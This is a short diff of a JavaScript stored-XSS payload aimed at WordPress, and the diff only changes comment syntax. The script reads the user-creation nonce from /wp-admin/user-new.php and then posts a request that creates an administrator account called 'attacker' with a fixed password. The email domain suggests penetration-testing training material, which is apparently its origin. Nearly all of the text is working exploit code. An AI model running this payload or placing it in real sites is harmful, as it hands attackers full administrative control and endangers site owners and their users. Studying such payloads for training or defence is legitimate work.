@@ -1,4 +1,4 @@
-################extract nonce##########
+// extract nonce
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
 var nonceRegex = /ser" value="([^"]*?)"/g;
@@ -7,7 +7,7 @@ ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 
-##############send request (example params) to safe code to db for XSS###############
+//send request (example params) to safe code to db for XSS
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
 ajaxRequest = new XMLHttpRequest();
 ajaxRequest.open("POST", requestURL, true);
